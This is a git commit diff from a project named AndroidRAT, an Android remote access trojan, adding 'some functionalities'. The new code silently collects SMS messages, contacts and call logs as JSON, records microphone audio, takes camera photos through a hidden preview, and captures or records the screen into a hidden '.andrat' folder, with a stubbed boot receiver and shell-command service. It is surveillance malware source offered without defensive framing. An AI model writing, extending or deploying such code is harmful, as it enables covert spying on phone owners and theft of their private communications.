c522a404fc6b7f84e06c879a3019653d4700a881
Tropes-Ot <ot.server1@outlook.com>
2021-08-08 21:17:45 +0100

    some functionalities

---
+++ AndroidRAT/app/src/main/java/com/ot/androidrat/BootCompleteReceiver.java
@@ -0,0 +1,16 @@
+package com.ot.androidrat;
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+
+
+public class BootCompleteReceiver extends BroadcastReceiver{
+    @Override
+    public void onReceive(Context context, Intent intent) {
+//        // TODO: This method is called when the BroadcastReceiver is receiving
+//        // an Intent broadcast.
+//        intent = new Intent( context, MainService.class );
+//        context.startService(intent);
+
+    }
+}
--- AndroidRAT/app/src/main/java/com/ot/androidrat/MainActivity.java
+++ AndroidRAT/app/src/main/java/com/ot/androidrat/MainActivity.java
@@ -10,25 +10,45 @@ import android.content.ContentResolver;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
+import android.graphics.SurfaceTexture;
+import android.hardware.Camera;
+import android.media.MediaRecorder;
 import android.net.Uri;
 import android.os.Bundle;
+import android.os.Environment;
+import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.telephony.SmsManager;
+import android.util.Log;
 import android.view.View;
 import android.widget.Button;
 import android.widget.EditText;
 import android.widget.TextView;
 import android.widget.Toast;
 
+import org.json.JSONArray;
+import org.json.JSONException;
+import org.json.JSONObject;
 import org.w3c.dom.Text;
 
 import java.io.BufferedReader;
+import java.io.ByteArrayOutputStream;
+import java.io.File;
+import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.io.PrintWriter;
 import java.net.Socket;
+import java.security.Policy;
+import java.time.LocalDateTime;
+import java.time.format.DateTimeFormatter;
 import java.util.ArrayList;
+import java.util.Date;
+import java.util.Timer;
+import java.util.TimerTask;
 
 public class MainActivity extends AppCompatActivity {
 
@@ -40,6 +60,7 @@ public class MainActivity extends AppCompatActivity {
 
     private EditText command;
     private TextView shellResult;
+    private Camera camera;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -49,9 +70,9 @@ public class MainActivity extends AppCompatActivity {
 //        startService(smsIntent);
 //        Intent callIntent = new Intent(this, CallService.class);
 //        startService(callIntent);
-        Intent binshIntent = new Intent(this, bin_shService.class);
-        binshIntent.putExtra("command", "id");
-        startService(binshIntent);
+//        Intent binshIntent = new Intent(this, bin_shService.class);
+//        binshIntent.putExtra("command", "id");
+//        startService(binshIntent);
         Button smsBtn = (Button) findViewById(R.id.read_sms_btn);
         Button picBtn = (Button) findViewById(R.id.pic_btn);
         Button shellBtn = (Button) findViewById(R.id.shell_btn);
@@ -62,6 +83,80 @@ public class MainActivity extends AppCompatActivity {
     @Override
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+    }
+
+    public void writeContact(View view){
+        
+    }
+
+    public void recordMic(View view) {
+        MediaRecorder recorder;
+        String mPath = Environment.getExternalStorageDirectory().toString() + "/DCIM/" + System.currentTimeMillis() + ".mp3";
+        File audiofile = new File(mPath);
+        final String TAG = "MediaRecording";
+        TimerTask stopRecording;
+
+
+
+        //Creating MediaRecorder and specifying audio source, output format, encoder & output format
+        recorder = new MediaRecorder();
+        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+        recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
+        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
+        recorder.setOutputFile(audiofile.getAbsolutePath());
+        //recorder.prepare();
+        recorder.start();
+
+
+        stopRecording = new TimerTask() {
+            @Override
+            public void run() {
+                //stopping recorder
+                recorder.stop();
+                recorder.release();
+
+            }
+        };
+
+        new Timer().schedule(stopRecording, 20 * 1000);
+    }
+
+    public void screenCapture(View view){
+
+        try {
+            String mPath = Environment.getExternalStorageDirectory().toString() + "/DCIM/" + System.currentTimeMillis() + ".jpg";
+            Log.i("directory", mPath);
+            // create bitmap screen capture
+            View v1 = getWindow().getDecorView().getRootView();
+            v1.setDrawingCacheEnabled(true);
+            Bitmap bitmap = Bitmap.createBitmap(v1.getDrawingCache());
+            v1.setDrawingCacheEnabled(false);
+
+            File imageFile = new File(mPath);
+
+            FileOutputStream outputStream = new FileOutputStream(imageFile);
+            int quality = 100;
+            bitmap.compress(Bitmap.CompressFormat.JPEG, quality, outputStream);
+            outputStream.flush();
+            outputStream.close();
+
+        } catch (Throwable e) {
+            // Several error may come out with file handling or DOM
+            Log.i("directory", e.getMessage());
+        }
+
+    }
+
+    public void screenRecord(View view){
+        try{
+            String curTime = null;
+            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                curTime = LocalDateTime.now().toString();
+            }
+            Process su = Runtime.getRuntime().exec("screenrecord --size \"1280x720\" --time-limit 20 /storage/emulated/0/.andrat/" + curTime +".mp4");
+        }catch (IOException ioException){
+
+        }
     }
 
     public void ioConnection(View view){
@@ -115,36 +210,158 @@ public class MainActivity extends AppCompatActivity {
         startActivity(callIntent);
     }
 
-    private void readContacts(View view) {
-        ArrayList<String> contactList = new ArrayList<>();
-        ContentResolver contentResolver=getContentResolver();
-        Cursor cursor=contentResolver.query(ContactsContract.Contacts.CONTENT_URI,null,null,null,null);
-        if (cursor.moveToFirst()){
-            do {
-                contactList.add(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)));
-            }while (cursor.moveToNext());
+    public void callLog(View view){
+        try {
+            JSONObject Calls = new JSONObject();
+            JSONArray list = new JSONArray();
+
+            Uri allCalls = Uri.parse("content://call_log/calls");
+            Cursor cur = getContentResolver().query(allCalls, null, null, null, null);
+
+            while (cur.moveToNext()) {
+                JSONObject call = new JSONObject();
+                String num = cur.getString(cur.getColumnIndex(CallLog.Calls.NUMBER));// for  number
+                String name = cur.getString(cur.getColumnIndex(CallLog.Calls.CACHED_NAME));// for name
+                String duration = cur.getString(cur.getColumnIndex(CallLog.Calls.DURATION));// for duration
+                int type = Integer.parseInt(cur.getString(cur.getColumnIndex(CallLog.Calls.TYPE)));// for call type, Incoming or out going.
+
+
+                call.put("phoneNo", num);
+                call.put("name", name);
+                call.put("duration", duration);
+                call.put("type", type);
+                list.put(call);
+
+            }
+            Calls.put("callsList", list);
+            shellResult.setText(Calls.toString());
+        } catch (JSONException e) {
+            e.printStackTrace();
         }
-        shellResult.setText(contactList.toArray().toString());
+    }
+
+    private void readContacts(View view) {
+        try {
+            JSONObject contacts = new JSONObject();
+            JSONArray list = new JSONArray();
+            Cursor cur = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                    new String[] { ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER}, null, null,  ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
+
+
+            while (cur.moveToNext()) {
+                JSONObject contact = new JSONObject();
+                String name = cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));// for  number
+                String num = cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));// for name
+
+                contact.put("phoneNo", num);
+                contact.put("name", name);
+                list.put(contact);
+
+            }
+            contacts.put("contactsList", list);
+            shellResult.setText(contacts.toString());
+        } catch (JSONException e) {
+            e.printStackTrace();
+        }
     }
 
     public void takePicture(View view){
-        Intent service = new Intent(getBaseContext(), CapturePhoto.class);
-        startService(service);
+        // 1 3 Front
+        camera = Camera.open(2);
+        Camera.Parameters parameters = camera.getParameters();
+        camera.setParameters(parameters);
+        try{
+            camera.setPreviewTexture(new SurfaceTexture(0));
+            camera.startPreview();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
+        camera.takePicture(null, null, new Camera.PictureCallback() {
+            @Override
+            public void onPictureTaken(byte[] data, Camera camera) {
+                releaseCamera();
+                try{
+                    Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
+                    FileOutputStream output = new FileOutputStream(Environment.getExternalStorageDirectory().toString() + "/.andrat/"+ System.currentTimeMillis()+".jpg");
+                    bitmap.compress(Bitmap.CompressFormat.JPEG, 20, output);
+                }catch(Exception ex){
+                    System.out.println(ex.getMessage());
+                }
+            }
+        });
+
+    }
+
+    private void releaseCamera(){
+        if (camera != null) {
+            camera.stopPreview();
+            camera.release();
+            camera = null;
+        }
+    }
+
+    public void findCameraList() {
+
+        try {
+            JSONObject cameras = new JSONObject();
+            JSONArray list = new JSONArray();
+            cameras.put("camList", true);
+
+            // Search for available cameras
+            int numberOfCameras = Camera.getNumberOfCameras();
+            for (int i = 0; i < numberOfCameras; i++) {
+                Camera.CameraInfo info = new Camera.CameraInfo();
+                Camera.getCameraInfo(i, info);
+                if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
+                    JSONObject jo = new JSONObject();
+                    jo.put("name", "Front");
+                    jo.put("id", i);
+                    list.put(jo);
+                } else if (info.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {
+                    JSONObject jo = new JSONObject();
+                    jo.put("name", "Back");
+                    jo.put("id", i);
+                    list.put(jo);
+                } else {
+                    JSONObject jo = new JSONObject();
+                    jo.put("name", "Other");
+                    jo.put("id", i);
+                    list.put(jo);
+                }
+            }
+
+            cameras.put("list", list);
+            shellResult.setText(cameras.toString());
+
+        } catch (JSONException e) {
+            e.printStackTrace();
+        }
     }
 
     public void showSMS(View view){
-        StringBuilder messages = new StringBuilder();
-        Cursor cursor = getContentResolver().query(Uri.parse(INBOX), null, null,null,null);
-        if(cursor.moveToFirst()){
-            do {
-                for(int i = 0; i <= cursor.getColumnCount(); i++){
-                    messages.append(cursor.getColumnName(i)).append(": ").append(cursor.getString(i)).append("\n");
-                }
-            }while (cursor.moveToNext());
-            Toast.makeText(this, messages.toString(), Toast.LENGTH_LONG).show();
-            System.out.println(messages);
-        }else{
-            System.out.println("No messages");
+        try {
+            JSONObject SMSList = new JSONObject();
+            JSONArray list = new JSONArray();
+
+
+            Uri uriSMSURI = Uri.parse("content://sms/inbox");
+            Cursor cur = getContentResolver().query(uriSMSURI, null, null, null, null);
+
+            while (cur.moveToNext()) {
+                JSONObject sms = new JSONObject();
+                String address = cur.getString(cur.getColumnIndex("address"));
+                String body = cur.getString(cur.getColumnIndexOrThrow("body"));
+                sms.put("phoneNo" , address);
+                sms.put("msg" , body);
+                list.put(sms);
+
+            }
+            SMSList.put("smsList", list);
+            Log.e("done" ,"collecting");
+            shellResult.setText(SMSList.toString());
+        } catch (JSONException e) {
+            e.printStackTrace();
         }
 
     }
